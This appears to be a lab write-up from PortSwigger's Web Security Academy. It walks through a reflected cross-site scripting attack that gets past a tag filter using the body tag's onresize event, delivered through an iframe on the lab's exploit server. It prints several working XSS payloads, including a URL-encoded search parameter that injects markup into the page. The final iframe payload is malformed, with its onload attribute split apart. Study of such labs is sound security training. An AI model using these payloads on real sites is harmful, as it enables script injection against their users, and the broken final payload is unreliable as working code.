---
sidebar_position: 2
image: "https://www.cloudflare.com/img/learning/security/threats/cross-site-scripting/xss-attack.png"
---

--> i found that `custom tags` and `<body>` tags are accepted.

![[Pasted image 20211026143657.png]]

--> Now we know that we can use `body` tag so let's now brute force for events.

I used this payload :

```markup
<body id=x tabindex=1 onactivate=alert(1)></body>
```

And i found `onresize` event is accepted.

![[Pasted image 20211026144237.png]]

--> So i searched for payload with body tag and onresize event and then i found this payload

```markup
<body onresize="print()">
```

==> Now we have to goto `exploit-server` tab and then enter your payload:

### But how we will render our payload in victim's browser?

So for that we will use `iframe` which will render our website in small frame and we know that `onresize` event is allowed so we will change the width of iframe on the load to trigger this event !

Then i made this payload:

```html
<iframe
  src="https://ac721f141f257377c03016fb002900d7.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E"
  onload="this.style.width"
  ="100px"
>
</iframe>
```

Now click on `store` and `Deliver exploit to victim` And we solved the lab!
